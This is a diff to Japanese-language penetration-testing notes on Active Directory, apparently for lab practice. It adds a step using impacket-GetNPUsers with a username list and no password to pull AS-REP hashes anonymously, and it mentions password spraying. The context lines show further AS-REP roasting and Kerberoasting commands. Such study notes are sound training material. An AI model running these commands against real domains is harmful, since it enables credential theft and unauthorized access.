@@ -28,6 +28,12 @@ domain/user => 認証のターゲットにするユーザとドメイン名
 impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
 ```
 
+4.1 ユーザ名をLdap経由で取得した後、匿名でそのユーザのAS-REPハッシュが取得できないかを調べる。  
+ユーザ名は事前に列挙してからリストを作成してパスワードスプレーをする。
+```
+sudo impacket-GetNPUsers -usersfile ./usernames.txt -no-pass -dc-ip <targetIP> htb.local/ > asrep-roasting
+```
+
 5. Kerberoastingを実行するために、TGSを取得してhashcatで解析できる形でサービスチケットのハッシュを出力する。
 ```
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
